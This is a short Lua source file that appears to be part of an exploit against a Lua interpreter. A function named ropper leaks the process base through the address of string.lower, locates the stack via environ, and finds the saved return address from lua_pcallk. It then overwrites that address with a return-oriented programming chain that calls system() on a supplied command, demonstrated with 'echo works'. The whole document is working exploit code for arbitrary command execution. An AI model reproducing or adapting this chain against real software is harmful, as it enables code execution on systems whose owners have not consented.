-- craft ROP chain, scan stack for return from lua_pcallk in main, write chain there
local function ropper(command)
    local proc_base = addrOf(string.lower) - STRING_LOWER_OFF
    local overwritten_ret_address = proc_base + OVERWRITTEN_RET_OFF
    local pop_rdi_ret = proc_base + POP_RDI_RET_OFF
    local ret = pop_rdi_ret + 1

    -- actual environ lives in linker?
    local environ = proc_base + ENVIRON_OFF
    local system_addr = proc_base + SYSTEM_OFF
    local exit = proc_base + EXIT_OFF

    local stack_addr = deubPTRSIZE(read(environ, PTRSIZE))
    stack_addr = stack_addr - (stack_addr % PTRSIZE)

    command = command .. '\x00'
    local command_ptr = dataPtr(command)

    local payload = PAYLOAD

    local target_addr = ubPTRSIZE(overwritten_ret_address)
    local write_addr = search_backwards(stack_addr, target_addr)
    if write_addr == nil then error("nil") end

    -- works without this, ~90% of the time, but crashes sometimes
    collectgarbage('stop')
    write(write_addr, payload)
end

local function main()
    ropper("echo works")
end

main()
